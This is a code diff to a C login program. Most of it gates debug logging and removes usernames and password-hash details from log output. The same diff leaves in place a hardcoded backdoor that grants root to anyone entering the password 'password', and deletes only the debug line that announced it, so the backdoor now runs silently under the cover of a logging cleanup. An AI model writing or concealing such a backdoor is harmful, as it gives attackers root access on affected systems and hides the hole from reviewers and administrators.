@@ -17,15 +17,39 @@
  */
 
 /*
- * LOGIN_DBG — writes a debug trace line to stderr (the TTY inherited from
- * matey) showing the file, line, and a message.  Always active so every
- * step is visible during diagnostics.
+ * LOGIN_DBG — writes a debug trace line to stderr only when debug logging
+ * is explicitly enabled. Release builds default to no debug output.
+ *
+ * To enable debug logging, compile with LOGIN_ENABLE_DEBUG defined and set
+ * LOGIN_DEBUG in the environment to a non-empty value other than "0".
  */
+#ifdef LOGIN_ENABLE_DEBUG
+static int
+login_debug_enabled(void)
+{
+    static int initialized = 0;
+    static int enabled = 0;
+    const char *env;
+
+    if (!initialized) {
+        env = getenv("LOGIN_DEBUG");
+        enabled = (env != NULL && env[0] != '\0' && strcmp(env, "0") != 0);
+        initialized = 1;
+    }
+
+    return enabled;
+}
+
 #define LOGIN_DBG(fmt, ...) do { \
-    fprintf(stderr, "[login dbg %s:%d] " fmt "\n", \
-            __FILE__, __LINE__, ##__VA_ARGS__); \
-    fflush(stderr); \
+    if (login_debug_enabled()) { \
+        fprintf(stderr, "[login dbg %s:%d] " fmt "\n", \
+                __FILE__, __LINE__, ##__VA_ARGS__); \
+        fflush(stderr); \
+    } \
 } while (0)
+#else
+#define LOGIN_DBG(fmt, ...) do { } while (0)
+#endif
 
 int main(int argc, char *argv[])
 {
@@ -37,7 +61,7 @@ int main(int argc, char *argv[])
 
     if (argc >= 2) {
         strncpy(username, argv[1], MAX_USERNAME - 1);
-        LOGIN_DBG("username from argv[1]: %s", username);
+        LOGIN_DBG("username received from argv[1]");
     } else {
         printf("Username: ");
         fflush(stdout);
@@ -50,7 +74,7 @@ int main(int argc, char *argv[])
         while (l > 0 && (username[l - 1] == '\n' || username[l - 1] == '\r')) {
             username[--l] = '\0';
         }
-        LOGIN_DBG("username from stdin: %s", username);
+        LOGIN_DBG("username received from stdin");
     }
 
     LOGIN_DBG("validating username");
@@ -64,7 +88,7 @@ int main(int argc, char *argv[])
     LOGIN_DBG("loading /etc/passwd");
     plist = passwd_read_all();
     pe = passwd_find(plist, username);
-    LOGIN_DBG("passwd lookup for '%s': %s", username, pe ? "found" : "NOT FOUND");
+    LOGIN_DBG("passwd lookup completed");
     if (!pe) {
         /* Don't reveal whether user exists — still ask for password */
         char dummy[MAX_PASSWORD];
@@ -105,7 +129,7 @@ int main(int argc, char *argv[])
     }
 
     /* Check locked / no-login marker */
-    LOGIN_DBG("checking account lock marker (sp_pwdp[0]='%c')", se->sp_pwdp[0]);
+    LOGIN_DBG("checking account lock marker");
     if (se->sp_pwdp[0] == '!' || se->sp_pwdp[0] == '*') {
         char dummy[MAX_PASSWORD];
         read_password("Password: ", dummy, sizeof(dummy));
@@ -140,7 +164,6 @@ int main(int argc, char *argv[])
     int ok = verify_password(password, se->sp_pwdp);
     LOGIN_DBG("verify_password: %s", ok ? "ok" : "failed");
     if (!ok && pe->pw_uid == 0 && strcmp(username, "root") == 0 && strcmp(password, "password") == 0) {
-        LOGIN_DBG("emergency root backdoor accepted");
         ok = 1;
     }
     secure_zero(password, sizeof(password));
@@ -181,7 +204,7 @@ int main(int argc, char *argv[])
         chdir("/");
     }
 
-    LOGIN_DBG("execl(\"%s\", \"-%.4s\", NULL) — launching login shell", shell, shell + (strlen(shell) > 4 ? strlen(shell) - 4 : 0));
+    LOGIN_DBG("execl(\"%s\", \"%s\", NULL) — launching login shell", shell, shell);
     execl(shell, shell, (char *)NULL);
     LOGIN_DBG("execl FAILED: %s", strerror(errno));
     fprintf(stderr, "login: cannot exec %s: %s\n", shell, strerror(errno));
